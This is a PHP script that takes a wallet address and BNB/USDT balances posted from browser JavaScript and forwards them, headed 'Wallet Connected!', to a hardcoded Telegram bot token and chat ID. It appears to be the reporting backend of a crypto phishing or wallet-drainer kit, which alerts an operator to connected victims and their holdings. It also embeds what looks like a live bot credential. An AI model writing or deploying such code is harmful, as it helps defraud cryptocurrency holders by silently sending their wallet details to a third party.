<?php
// Accept JSON input from JS
$data = json_decode(file_get_contents("php://input"), true);

// Extract wallet and balances
$address = isset($data['wallet']) ? $data['wallet'] : 'Not Found';
$bnb     = isset($data['bnb']) ? $data['bnb'] : '0';
$usdt    = isset($data['usdt']) ? $data['usdt'] : '0';

// Your actual Telegram bot token and chat ID
$token   = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
$chat_id = '8191508290';

// Prepare Telegram message
$message = "📥 *Wallet Connected!*\n\n"
         . "👛 *Address:* `$address`\n"
         . "💰 *BNB:* $bnb\n"
         . "💸 *USDT:* $usdt";

// Send message via Telegram Bot API
$url = "https://api.telegram.org/bot$token/sendMessage";
$params = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// Use cURL instead of file_get_contents for better reliability
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Optional: Log response for debugging
// file_put_contents("debug.log", $response . PHP_EOL, FILE_APPEND);
?>
